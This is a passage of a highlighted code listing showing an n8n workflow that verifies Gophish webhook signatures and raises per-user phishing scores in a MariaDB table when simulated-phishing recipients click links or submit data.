class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Gophish to Phishing Score Database"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"nodes"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Error: No signature found in request header"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"c77c4304-a74e-4699-9b2c-52c7a8500fb4"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"no signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">660</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">620</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Error: Provided signature is not valid"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"da08f3e5-60c4-4898-ab28-d9f92aae2fe2"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"invalid signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1380</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">540</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"UPDATE victims\nSET phishing_score = phishing_score + 10\nWHERE email = $1;"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"queryReplacement"</span><span class="punctuation">:</span> <span class="string">"={{ $json.email }}"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"e83be7d7-0c4a-4ca8-b341-3a40739f8825"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Clicked Event"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.mySql"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2.4</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2360</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"credentials"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"mySql"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"qEqs6Hx9HRmSTg5v"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"mariadb - phishing"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"ad6553f3-0e01-497a-97b5-3eba88542a11"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"exists"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"2a041864-d4b5-4c7d-a887-68792d576a73"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"Clicked Link"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"c4c08710-b02c-4625-bdc3-19de5653844d"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"If Clicked"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2120</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">320</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"executeQuery"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"query"</span><span class="punctuation">:</span> <span class="string">"UPDATE victims\nSET phishing_score = phishing_score + 50\nWHERE email = $1;"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"queryReplacement"</span><span class="punctuation">:</span> <span class="string">"={{ $json.email }}"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"220e3d9d-07f1-425e-a139-a51308737a89"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Update Phishing Score for Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.mySql"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2.4</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2360</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">560</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"credentials"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"mySql"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"qEqs6Hx9HRmSTg5v"</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"mariadb - phishing"</span></span><br><span class="line">        <span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"ad6553f3-0e01-497a-97b5-3eba88542a11"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"exists"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"2a041864-d4b5-4c7d-a887-68792d576a73"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $('Webhook').item.json.body.message }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"9f49f588-12b7-4e3a-8d1a-74898b215d60"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"If Submitted Data"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2120</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">500</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"Success: Phishing score is updated"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"58eecf3c-97e9-4879-aaec-cd5759cb1ef8"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Success"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">2660</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">460</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"8e2c34bd-a337-41e1-94a4-af319a991680"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.signature }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.calculated_signature }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"equals"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"filter.operator.equals"</span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"8b12bac8-f513-422e-a582-99f67b87b24f"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Compare signature"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1100</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">340</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"respondWith"</span><span class="punctuation">:</span> <span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"responseBody"</span><span class="punctuation">:</span> <span class="string">"={{ $json.message }} | {{ JSON.stringify($json.error)}}"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"d3f8446a-81af-4e5a-894e-e0eab0596364"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"DEBUG: REMOVE SOON"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.respondToWebhook"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">1.1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1620</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">20</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">          <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"caseSensitive"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">""</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"typeValidation"</span><span class="punctuation">:</span> <span class="string">"strict"</span></span><br><span class="line">          <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"conditions"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">              <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"593bdf17-d38a-49a2-8431-d29679082aae"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"leftValue"</span><span class="punctuation">:</span> <span class="string">"={{ $json.headers.hasField('x-gophish-signature') }}"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"rightValue"</span><span class="punctuation">:</span> <span class="string">"true"</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">"operator"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"boolean"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"operation"</span><span class="punctuation">:</span> <span class="string">"true"</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">"singleValue"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">              <span class="punctuation">}</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">"combinator"</span><span class="punctuation">:</span> <span class="string">"and"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"options"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="punctuation">}</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="string">"0abc2e19-6ccc-4114-bf27-938b98ad5819"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"Check gophish header"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"n8n-nodes-base.if"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"typeVersion"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"position"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">440</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">440</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"parameters"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"jsCode"</span><span class="punctuation">:</span> <span class="string">"const signatureHeader = $json.headers[\"x-gophish-signature\"];\nconst signature = signatureHeader.split('=')[1];\nreturn { json: { signature: signature, body: $json.body } };"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span 